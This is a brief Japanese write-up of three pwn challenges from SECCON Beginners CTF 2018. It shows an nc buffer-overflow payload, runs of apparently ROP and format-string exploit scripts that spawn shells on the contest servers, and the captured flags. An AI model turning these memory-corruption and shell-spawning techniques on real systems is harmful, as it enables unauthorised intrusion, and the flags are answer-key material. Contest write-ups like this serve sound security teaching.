SECCON BeginnersCTF 2018 pwn問題のwriteupです。

# [Warmup] condition 85 point

```
$ python -c 'print "\x00"*44+"\xef\xbe\xad\xde"'|nc pwn1.chall.beginners.seccon.jp 16268
Please tell me your name...OK! You have permission to get flag!!
ctf4b{T4mp3r_4n07h3r_v4r14bl3_w17h_m3m0ry_c0rrup710n}
```

# BBS 304 point

```
$ python exp_bbs.py -r
libc:  0x7f2d59871000
binsh:  0x7f2d599fdd57
Input Content : 
==============================

Sun May 27 13:48:27 JST 2018
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAc@

==============================
id
uid=20209 gid=20000(bbs) groups=20000(bbs)
ls
bbs
flag.txt
cat flag.txt
ctf4b{Pr3p4r3_4rgum3n75_w17h_ROP_4nd_c4ll_4rb17r4ry_func710n5}

```

# Seczon 388 point

```
$ python exp_seczon.py -r
libc:  0xf7609000
system:  0xf7643da0
free_hook:  0xf77bc8b0
0x3da0
0xf764
 Confirmation
sh


Action:
>>   
id
uid=30125 gid=30000(seczon) groups=30000(seczon)
ls
flag.txt
seczon
cat flag.txt
ctf4b{F0rm4t_5tr!ng_Bug_w!th_4lr3ady_pr!nt3d_d4t4}
```
